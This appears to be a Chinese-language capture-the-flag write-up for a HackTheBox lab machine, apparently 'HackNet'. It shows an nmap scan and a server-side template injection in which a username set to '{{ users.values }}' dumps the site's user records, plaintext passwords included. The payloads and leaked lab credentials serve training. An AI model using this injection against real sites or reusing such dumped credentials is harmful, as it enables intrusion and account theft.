
## 扫描
```SHELL
$ nmap -Pn -A 10.10.11.85
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 03:15 EDT
Nmap scan report for 10.10.11.85
Host is up (2.2s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   595.89 ms 10.10.16.1
2   631.20 ms 10.10.11.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.58 seconds

```

## web
![](attachments/Pasted%20image%2020250922152328.png)

ssti无法执行命令和python 利用修改用户名为变量渲染在点赞一个post后可以对自己的名字进行渲染

![](attachments/Pasted%20image%2020250922161949.png)

`{{ users.values }}`
![](attachments/Pasted%20image%2020250922162224.png)

```
<QuerySet [{'id': 1, 'email': 'cyberghost@darkmail.net', 'username': 'cyberghost', 'password': 'Gh0stH@cker2024', 'picture': '1.jpg', 'about': 'A digital nomad with a knack for uncovering vulnerabilities in the deep web. Passionate about cryptography and secure communications.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 6, 'email': 'shadowcaster@darkmail.net', 'username': 'shadowcaster', 'password': 'Sh@d0wC@st!', 'picture': '6.jpg', 'about': 'Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 9, 'email': 'glitch@cypherx.com', 'username': 'glitch', 'password': 'Gl1tchH@ckz', 'picture': '9.png', 'about': 'Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 13, 'email': 'netninja@hushmail.com', 'username': 'netninja', 'password': 'N3tN1nj@2024', 'picture': '13.png', 'about': 'Network security expert focused on intrusion detection and prevention. Known for slicing through firewalls with ease.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 19, 'email': 'exploit_wizard@hushmail.com', 'username': 'exploit_wizard', 'password': 'Expl01tW!zard', 'picture': '19.jpg', 'about': 'An expert in exploit development and vulnerability research. Loves crafting new ways to break into systems.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 21, 'email': 'whitehat@darkmail.net', 'username': 'whitehat', 'password': 'Wh!t3H@t2024', 'picture': '21.jpg', 'about': 'An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 22, 'email': 'deepdive@hacknet.htb', 'username': 'deepdive', 'password': 'D33pD!v3r', 'picture': '22.png', 'about': 'Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': True}, {'id': 23, 'email': 'virus_viper@securemail.org', 'username': 'virus_viper', 'password': 'V!rusV!p3r2024', 'picture': '23.jpg', 'about': 'A malware creator focused on developing viruses that spread rapidly. Known for unleashing digital plagues.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 24, 'email': 'brute_force@ciphermail.com', 'username': 'brute_force', 'password': 'BrUt3F0rc3#', 'picture': '24.jpg', 'about': 'Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 29, 'email': 'kali@123', 'username': '{{users.values}}', 'password': 'kali', 'picture': 'profile.png', 'about': '', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': True, 'two_fa': False}, {'id': 31, 'email': 'wum0nster@email.com', 'username': '{{ users.values }}', 'password': '123456', 'picture': 'profile.png', 'about': "{{7*'7'}}", 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': True, 'two_fa': False}]>
```